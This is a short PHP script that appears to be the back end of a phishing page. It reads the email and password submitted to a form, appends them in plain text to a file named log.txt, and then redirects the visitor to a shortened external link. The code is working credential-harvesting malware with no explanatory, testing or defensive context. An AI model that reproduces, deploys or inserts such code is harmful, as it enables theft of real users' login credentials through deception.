<?php
$url = 'link';
$email = $_POST['email'];
$pass  = $_POST['pass'];
$handle = fopen("log.txt", "a");
fwrite($handle,  "$email|$pass\n");
fclose($handle);
header('Location: http://megaurl.in/bB6DhD');
?>